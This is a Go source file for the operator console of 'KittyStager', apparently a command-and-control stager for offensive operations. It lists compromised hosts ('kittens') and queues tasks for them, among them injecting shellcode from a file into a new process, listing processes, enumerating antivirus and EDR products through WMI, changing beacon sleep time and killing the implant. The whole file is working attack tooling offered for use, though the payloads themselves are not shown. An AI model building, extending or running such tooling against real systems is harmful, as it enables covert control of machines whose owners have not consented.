package cli

import (
	"KittyStager/internal/task"
	"encoding/json"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/c-bata/go-prompt"
	color "github.com/logrusorgru/aurora"
	"os"
	"reflect"
	"strings"
)

func completerCli(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit the program"},
		{Text: "config", Description: "Show config"},
		{Text: "logs", Description: "Get api logs"},
		{Text: "kittens", Description: "Show kittens"},
		{Text: "interact", Description: "Interact with a target"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

// completerInteract is the completer for the interact menu
func completerInteract(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "back", Description: "Go back to the main menu"},
		{Text: "task", Description: "Get the tasks for the target"},
		{Text: "shellcode", Description: "Inject shellcode in new process"},
		{Text: "sleep", Description: "Set sleep time"},
		{Text: "ps", Description: "Get process list"},
		{Text: "av", Description: "Get AV/EDR with wmi"},
		{Text: "info", Description: "Show the kitten info"},
		{Text: "kill", Description: "Exit the kitten"},
		{Text: "exit", Description: "Exit the program"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func Cli() error {
	for {
		t := prompt.Input("KittyStager ❯ ", completerCli,
			prompt.OptionTitle("KittyStager 🐈 "),
			prompt.OptionPrefixTextColor(prompt.Blue),
			prompt.OptionPreviewSuggestionTextColor(prompt.Green),
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
			prompt.OptionSelectedSuggestionTextColor(prompt.Blue),
			prompt.OptionDescriptionBGColor(prompt.Blue),
			prompt.OptionSuggestionBGColor(prompt.DarkGray),
		)
		input := strings.Split(t, " ")
		switch input[0] {
		case "exit":
			fmt.Println("Bye bye!")
			return nil
		case "config":
			config, err := getConfig()
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			j, err := json.MarshalIndent(config, "", "  ")
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			fmt.Println(string(j))
		case "kittens":
			kittens, err := getKittens()
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			err = printKittens(kittens)
			if err != nil {
				fmt.Printf("%s\n", color.BrightGreen(err))
				break
			}
		case "interact":
			kittens, err := getKittens()
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			//check if there is only one kitten directly interact
			if len(kittens) == 2 {
				key := reflect.ValueOf(kittens).MapKeys()
				//get key
				for j := range key {
					if kittens[key[j].String()].Alive {
						err := interact(key[j].String())
						if err != nil {
							fmt.Println("[!] Error",err)
							break
						}
					}
				}
			} else {
				err = printKittens(kittens)
				if err != nil {
					fmt.Printf("%s\n", color.BrightGreen(err))
					break
				}
				name, err := i.Read("Kitten name : ")
				if err != nil {
					fmt.Println("[!] Error",err)
					break
				}
				_, ok := kittens[name]
				// If the key exists
				if ok && len(name) != 0 {
					err = interact(name)
					if err != nil {
						return err
					}
				} else {
					fmt.Println("[!] Invalid input")
					break
				}
			}
		case "logs":
			err := printLogs()
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
		case "build":
			fmt.Println("TODO")
		default:
			fmt.Println("Unknown command")
		}
	}
}

// interact menu
func interact(kittenName string) error {
	go checkAlive(kittenName)
	in := fmt.Sprintf("KittyStager - %s❯ ", kittenName)
	for {
		t := prompt.Input(in, completerInteract,
			prompt.OptionPrefixTextColor(prompt.Blue),
			prompt.OptionPreviewSuggestionTextColor(prompt.Green),
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
			prompt.OptionSelectedSuggestionTextColor(prompt.Blue),
			prompt.OptionDescriptionBGColor(prompt.Blue),
			prompt.OptionSuggestionBGColor(prompt.DarkGray))
		input := strings.Split(t, " ")
		switch input[0] {
		case "exit":
			fmt.Println("Bye bye!")
			os.Exit(0)
		case "back":
			return nil
		case "task":
			t, err := getTask(kittenName)
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			printTasks(t)
		case "shellcode":
			fmt.Printf("%s\n", "Please enter the path to the shellcode")
			//var path string
			path, err := i.Read("Path: ")
			if err != nil {
				return err
			}
			if path == "" {
				fmt.Println("[!] Please enter a path")
				break
			}
			shellcode, err := newShellcode(path)
			if err != nil {
				return err
			}
			t := task.Task{
				Tag:     "payload",
				Payload: shellcode,
			}
			err = createTask(&t, kittenName)
			if err != nil {
				return err
			}
		case "sleep":
			if len(input) != 2 {
				fmt.Println("[!] Please enter a path")
				break
			}
			t := task.Task{
				Tag:     "sleep",
				Payload: []byte(input[1]),
			}
			err := createTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
		case "ps":
			t := task.Task{
				Tag:     "ps",
				Payload: nil,
			}
			err := createTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			go checkForResponse(kittenName)
		case "av":
			t := task.Task{
				Tag:     "av",
				Payload: nil,
			}
			err := createTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			go checkForResponse(kittenName)
		case "info":
			kitten, err := getKitten(kittenName)
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
			printKittenInfo(*kitten)
		case "kill":
			t := task.Task{
				Tag:     "kill",
				Payload: nil,
			}
			err := createTask(&t, kittenName)
			if err != nil {
				fmt.Println("[!] Error",err)
				break
			}
		default:
			fmt.Println("Unknown command")
		}
	}
}
